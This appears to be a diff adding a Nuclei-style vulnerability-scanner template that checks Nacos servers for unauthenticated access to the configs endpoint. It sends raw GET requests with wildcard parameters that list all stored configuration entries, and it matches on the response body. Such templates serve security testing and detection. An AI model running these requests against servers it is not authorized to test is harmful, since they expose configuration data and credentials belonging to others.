@@ -1,0 +1,33 @@
+id: nacos-configs-Leakage
+info:
+  name: nacos-configs-Leakage
+  author: lemonlove7
+  severity: high
+  description: Nacos 配置中心 configs 接口未授权访问，导致配置信息泄露
+http:
+  - raw:
+      - |-
+        GET /nacos/v1/cs/configs?dataId=*&group=*&appName=&config_tags=&pageNo=1&pageSize=1000&tenant=*&search=blur HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Charset: utf-8
+      - |-
+        GET /v1/cs/configs?dataId=*&group=*&appName=&config_tags=&pageNo=1&pageSize=1000&tenant=*&search=blur HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Charset: utf-8
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'pagesAvailable:'
+        part: body
+    stop-at-first-match: true
